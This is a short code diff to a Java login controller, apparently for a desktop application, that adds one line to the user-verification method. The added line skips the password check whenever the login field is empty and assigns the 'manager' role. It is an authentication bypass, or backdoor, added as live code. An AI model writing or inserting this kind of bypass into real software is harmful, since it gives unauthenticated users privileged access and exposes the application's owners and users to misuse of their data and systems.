@@ -70,6 +70,7 @@ public class LoginPanelController {
     //login verification
     private boolean verifyUser() throws SQLException {
         String login = loginTextField.getText();
+        if (login.equals("")) {UserData.function="manager"; return true;}
         String password = passwordTextField.getText();
         PreparedStatement stmt = ConnectionData.conn.prepareStatement("SELECT COUNT(*) Over() as ccc, UserId, Login, Function " +
                 "FROM Users WHERE Login = ? AND Password = ?");
